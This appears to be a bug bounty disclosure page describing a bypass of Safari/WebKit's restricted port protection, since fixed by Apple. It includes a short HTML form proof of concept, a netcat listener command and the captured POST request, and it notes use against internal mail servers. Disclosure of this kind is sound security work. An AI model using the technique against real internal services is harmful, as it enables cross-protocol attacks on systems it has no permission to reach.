<!DOCTYPE html> <html> <head> <meta charset="utf-8"> <base target="_blank"> <meta name="apple-mobile-web-app-capable" content="yes"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <meta name="viewport" content="width=device-width, initial-scale=1"> <title> [#0007] Bypassing restricted port protection in WebKit | feed </title> <meta name="description" content=" xdavidhu&#39;s bug bounty disclosures. "> <meta name="keywords" content=""> <meta name="HandheldFriendly" content="True"> <meta name="MobileOptimized" content="320"> <!-- Social: Twitter --> <meta name="twitter:card" content="summary_large_image"> <meta name="twitter:site" content="xdavidhu"> <meta name="twitter:title" content="Bypassing restricted port protection in WebKit"> <meta name="twitter:description" content="xdavidhu's bug bounty disclosures."> <meta name="twitter:image:src" content="http://192.168.56.106:9885/asd/assets/img/cover.png"> <!-- Social: Open Graph --> <meta name="title" property="og:title" content="Bypassing restricted port protection in WebKit"> <meta name="description" property="og:description" content="xdavidhu's bug bounty disclosures."> <meta name="image" property="og:image" content="http://192.168.56.106:9885/asd/assets/img/cover.png"> <meta name="author" content="David Schütz"> <!-- Canonical link tag --> <link rel="canonical" href="http://192.168.56.106:9885/asd/bugs/0007"> <link rel="alternate" type="application/rss+xml" title="feed" href="http://192.168.56.106:9885/asd/feed.xml"> <!-- rel prev and next --> <link rel="stylesheet" href="http://192.168.56.106:9885/asd/assets/css/main.css"> </head> <body> <main class="wrapper"> <header class="site-header"> <nav> <div class="container nav-container"> <h1 class="logo"><a href="http://192.168.56.106:9885/asd/" target="_self">feed<span></span></a></h1> <ul class="navbar"> <li><a href="https://bugs.xdavidhu.me/" target="_self">bugs.xdavidhu.me</a></li> </ul> </div> </nav> </header> <article class="post container" itemscope itemtype="http://schema.org/BlogPosting"> <header class="post-header"> <p class="post-meta"> <span>#0007</span><br/> <span>Vendor: Apple</span><br/> <span>Status: fixed</span><br/> <span>Reported: Mar 13, 2021</span><br/> <span>Disclosed: </span><time datetime="2021-05-26T00:00:00+00:00" itemprop="datePublished">May 26, 2021</time> (74 days) </p> <h1 class="post-title" itemprop="name headline">Bypassing restricted port protection in WebKit</h1> </header> <div class="post-content" itemprop="articleBody"> <p><strong>Summary:</strong></p> <p>Safari <a href="https://fetch.spec.whatwg.org/#port-blocking">restricted port blocking</a> is not enforced properly. When requesting a page on a restricted port, only rendering is blocked, but the initial request gets sent to the restricted port.</p> <p><strong>Steps to reproduce:</strong></p> <ol> <li>Create an HTML file with this POC:</li> </ol> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;form action="http://127.0.0.1:6000" method="POST" enctype="multipart/form-data"&gt;
    &lt;label for="data"&gt;post data:&lt;/label&gt;
    &lt;input type="text" id="data" name="data"&gt;
&lt;/form&gt;
</code></pre></div></div> <ol start="2"> <li>Listen on port 6000 (a restricted port) with netcat: <code class="language-plaintext highlighter-rouge">$ nc -l 127.0.0.1 6000</code></li> <li>Open the HTML file created in <code class="language-plaintext highlighter-rouge">Step 1.</code> in Safari</li> <li>Enter any value into the <code class="language-plaintext highlighter-rouge">post data:</code> form field, and press enter</li> <li>See that Safari shows an error with the message:</li> </ol> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Safari can't open the page "http://127.0.0.1:6000/". The error is: "Not allowed to use
restricted network port" (WebKitErrorDomain:103)
</code></pre></div></div> <ol start="6"> <li>In the terminal running netcat, see that the request still got sent:</li> </ol> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nc -l 127.0.0.1 6000
POST / HTTP/1.1
Host: 127.0.0.1:6000
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFFmUrfH05DvsT29s
Origin: null
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15
Content-Length: 153
Accept-Language: en-gb
Accept-Encoding: gzip, deflate

------WebKitFormBoundaryFFmUrfH05DvsT29s
Content-Disposition: form-data; name="data"

123_test_post_data
------WebKitFormBoundaryFFmUrfH05DvsT29s--
</code></pre></div></div> <p><strong>Impact:</strong></p> <p>This could be used to bypass the restricted port protection, and send malicious commands to non-HTTP services running on these sensitive ports, like mail servers. This blog post demonstrates the impact, exploiting internal SMTP servers: <a href="https://cxsecurity.com/issue/WLB-2010030240">https://cxsecurity.com/issue/WLB-2010030240</a></p> <p><strong>[Disclosure Warning]:</strong></p> <p><strong>This issue is subject to a 90 day disclosure deadline.</strong> On <code class="language-plaintext highlighter-rouge">2021-06-11</code> this issue will be publicly disclosed. If you would like to redact additional information or if for some reason the issue can’t be fixed until the deadline, let me know.</p> <p><em>This issue was fixed in <a href="https://support.apple.com/en-us/HT212528">iOS/iPadOS 14.6</a>, <a href="https://support.apple.com/en-us/HT212529">macOS Big Sur 11.4</a>, <a href="https://support.apple.com/en-us/HT212534">Safari 14.1.1</a>, <a href="https://support.apple.com/en-us/HT212533">watchOS 7.5</a> and in <a href="https://support.apple.com/en-us/HT212532">tvOS 14.6</a>.</em></p> <p><em>Suspected WebKit commit: <a href="https://github.com/WebKit/WebKit/commit/b5ad31c21d9194b9246a5cc9f649fccbafd028f2">b5ad31c</a></em></p> </div> </article> </main> </body> </html>
